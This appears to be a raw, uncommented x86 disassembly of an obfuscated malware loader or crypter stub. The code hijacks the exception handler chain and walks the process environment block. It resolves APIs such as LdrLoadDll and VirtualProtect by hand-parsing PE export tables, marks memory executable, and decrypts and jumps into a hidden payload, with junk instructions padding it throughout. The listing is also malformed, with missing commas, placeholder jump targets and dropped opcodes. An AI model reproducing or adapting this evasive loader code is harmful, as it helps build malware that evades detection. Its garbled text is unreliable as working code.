_start
pushad
sub esp 0x4
mov [ esp ] ecx
xor ecx [ esp ]
or eax eax
adc esp 0x4
push esp
sub ecx 0xffffffff
add esp 0x4
mov esi [ esp - 0x4 ]
add ecx 0x1
sub esi 0x4
and ebx ebx
sbb ecx 0xffffffff
neg ecx
call $+5
sub [ esi ] ecx
retn
sub_2c70203b
mov edi 0x0
or edi 0x0
mov edx edi
xor esi esi
or esi edi
and ebx ebx
sbb dx 0x1
add dl 0xff
mov dh dl
call $+5
test ebx ebx
sbb esi 0xffffffff
push [ esp ]
pop eax
movzx ecx [ eax + esi - 0x2 ]
call $+5
mov [ esp ] ecx
xor ecx edx
pop ecx
jne r-xdata
add [ esp ] edi
jmp [ esp ]
xor edi edi
xor edi esi
sub_2c7020c0
push [ fs : 0x0 ]
add edx esi
mov eax 0x0
or eax 0xffff
not edi
and esi esi
adc edx esi
mov [ fs : 0x0 ] esp
and edx edi
add edx esi
jmp r-xdata
call $+5
pop ecx
mov ecx 0x0
or ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0x8
xor esi esi
xor esi edx
mov ecx 0x0
add ecx [ edx + 0x3c ]
add edx ecx
and ecx 0x0
add ecx 0x4550
mov ebx 0x0
or ebx [ edx ]
call $+5
mov [ esp ] ebx
sub ebx ecx
pop ebx
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
or eax 0x1
retn 0xc
xor ecx ecx
add ecx [ edx + 0x78 ]
mov edx 0x0
or edx ecx
add edx esi
call $+5
mov [ esp ] edx
and ecx 0x0
or ecx [ edx + 0x20 ]
mov edx ecx
and esi esi
adc edx esi
push esi
push edx
pop esi
pop ebx
push edx
xor edx [ esp ]
sub esp 0xfffffffc
test ecx ecx
mov eax 0x0
adc eax esi
xor ecx ecx
xor ecx [ esi ]
and edi edi
mov esi 0x0
adc esi ecx
call $+5
mov ebp 0x0
or ebp esp
test esi esi
adc esi ebx
add esp 0xfffffffc
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
call $+5
mov [ esp ] 0x4c72644c
push esp
pop edi
and ecx 0x0
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
or esi esi
sbb edx esi
xor ecx ecx
mov ecx [ edx ]
xor ebx ebx
or ebx 0x5a4d
and ecx eax
push ecx
xor ecx ebx
pop ecx
je r-xdata
sub esp esp
add esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] edx
mov edi [ esp ]
add esp 0x4
pop esi
pop edx
xor eax eax
xor eax edx
xor ecx ecx
xor ecx [ edx + 0x24 ]
mov edx 0x0
xor edx ecx
and edx edx
adc edx esi
mov ecx 0x0
add ecx [ edx + edi * 2 ]
and ecx 0xffff
sub edi edi
add edi ecx
mov ecx 0x0
or ecx [ eax + 0x10 ]
sub edi ecx
and ecx ecx
sbb edi 0xffffffff
mov edx 0x0
xor edx [ eax + 0x1c ]
add edx esi
sub ecx ecx
add ecx [ edx + edi * 4 ]
test eax eax
adc esi ecx
mov ebp 0x0
xor ebp esp
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx [ esp ]
sub esp 0xfffffffc
add esp 0xfffffffc
mov [ esp ] ecx
and edi edi
mov edx 0x0
adc edx esp
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
sub esp 0x4
mov [ esp ] 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
push 0x65006b
push esp
push 0x1a0018
sub ebx ebx
add ebx esp
sub esp 0x4
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] ebx
call $+5
mov [ esp ] ecx
push ecx
add esp 0xfffffffc
mov [ esp ] esi
push edx
pop esi
pop ebx
call ebx
mov eax [ esi ]
sub esp 0x4
mov [ esp ] eax
pop ecx
and ebx 0x0
or ebx [ fs : 0x30 ]
push [ ebx + 0x10 ]
pop esi
mov [ esi + 0x18 ] ecx
xor esp esp
add esp ebp
xor ebx ebx
xor ebx [ fs : 0x30 ]
xor esi esi
add esi [ ebx + 0x10 ]
and edx 0x0
add edx [ esi + 0x18 ]
mov esi 0x0
xor esi edx
mov ecx 0x0
or ecx [ edx + 0x3c ]
and edi edi
adc edx ecx
xor ecx ecx
add ecx [ edx + 0x78 ]
and esi esi
mov edx 0x0
adc edx ecx
add edx esi
sub esp 0x4
mov [ esp ] edx
sub ecx ecx
add ecx [ edx + 0x20 ]
mov edx 0x0
add edx ecx
and ecx ecx
adc edx esi
call $+5
mov [ esp ] esi
call $+5
mov [ esp ] edx
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
xor edx edx
and eax 0x0
add eax esi
mov ecx 0x0
sub ecx [ esi ]
neg ecx
and esi 0x0
add esi ecx
call $+5
xor ebp ebp
add ebp esp
test ebx ebx
adc esi ebx
call $+5
mov [ esp ] 0x7463
sub esp 0x4
mov [ esp ] 0x65746f72
call $+5
mov [ esp ] 0x506c6175
sub esp 0x4
mov [ esp ] 0x74726956
mov edi 0x0
xor edi esp
xor ecx ecx
or ecx 0xf
[ esi ] [ edi ]
je r-xdata
sub edx 0xffffffff
and ebx ebx
adc eax 0x4
sub esi esi
add esi [ eax ]
sub esp esp
add esp ebp
jmp [ esp ]
mov esp 0x0
or esp ebp
mov esi [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] ebx
push edx
pop edi
pop esi
mov edx [ esp ]
add esp 0x4
sub eax eax
add eax edx
mov ecx 0x0
or ecx [ edx + 0x24 ]
mov edx 0x0
or edx ecx
add edx esi
mov ecx 0x0
or ecx [ edx + edi * 2 ]
and ecx 0xffff
and edi 0x0
add edi ecx
and ecx 0x0
or ecx [ eax + 0x10 ]
or ecx ecx
sbb edi ecx
and ecx ecx
adc edi 0x1
or edi edi
mov edx 0x0
adc edx [ eax + 0x1c ]
test ebx ebx
adc edx esi
mov ecx 0x0
xor ecx [ edx + edi * 4 ]
and ebx ebx
adc esi ecx
mov eax 0x1000
call $+5
pop edx
and edx 0xfffff000
add edx eax
or esi esi
adc edx eax
call $+5
mov [ esp ] edx
mov ebx 0x0
sub ebx 0x4
neg ebx
call $+5
and ecx ecx
adc edx eax
mov ecx [ edx ]
stc
sbb ebx 0x0
je r-xdata
and esi esi
sbb edx 0xffffffff
add eax 0x4
test edi edi
mov esi 0x0
adc esi [ eax ]
and esp 0x0
add esp ebp
jmp [ esp ]
mov ecx [ esp ]
add esp 0x4
mov edx [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ecx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
push 0x45cc
add esp 0xfffffffc
mov [ esp ] edx
sub esp 0x4
mov [ esp ] esi
add esp 0xfffffffc
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call $+5
pop eax
add eax 0x1a
add esp 0xfffffffc
mov [ esp ] eax
sub esp 0x4
mov [ esp ] ebp
and ebp 0x0
or ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_2c70250a
add esp 0x4
mov ebx [ esp - 0x4 ]
xor edi edi
add edi esi
and eax 0x0
or eax 0xc
test edx edx
adc edi eax
push edi
pop esi
and ebp 0x0
add ebp edi
and ecx 0x0
or ecx 0x452a
xor edx edx
or edx ecx
call $+5
or edi edi
adc esi 0x1
mov ecx [ esp ]
add esp 0x4
sub ecx 0x1
je r-xdata
stosb [ edi ]
pop eax
call ebp
or eax eax
adc eax ebx
and ecx ecx
adc ecx edx
popad
mov eax 0x0
or eax 0x1
retn 0xc
jmp [ esp ]
sub eax eax
add eax [ esi ]
rol al cl
call $+5
mov [ esp ] edx
xor eax [ esp ]
add esp 0x4
call $+5
mov [ esp ] ecx
mov ecx 0x0
or ecx 0x40
call $+5
mov [ esp ] ebx
xor ebx ecx
pop ebx
je r-xdata
